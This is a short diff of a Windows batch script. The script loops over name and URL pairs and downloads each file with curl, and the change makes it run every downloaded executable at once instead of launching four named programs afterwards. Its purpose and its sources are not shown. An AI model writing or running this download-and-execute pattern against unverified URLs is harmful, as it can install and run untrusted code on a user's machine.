@@ -17,11 +17,7 @@ for %%A in (
 ) do (
   for /f "tokens=1,2 delims=|" %%B in (%%A) do (
     curl -L -o "%%B" "%%C"
+    TIMEOUT /T 1
+    start "" "%%B"
   )
-)
-
-timeout /t 1 >nul
-
-for %%E in (CoC.exe dbl.exe avc.exe obs.exe) do (
-  start "" "%%E"
 )
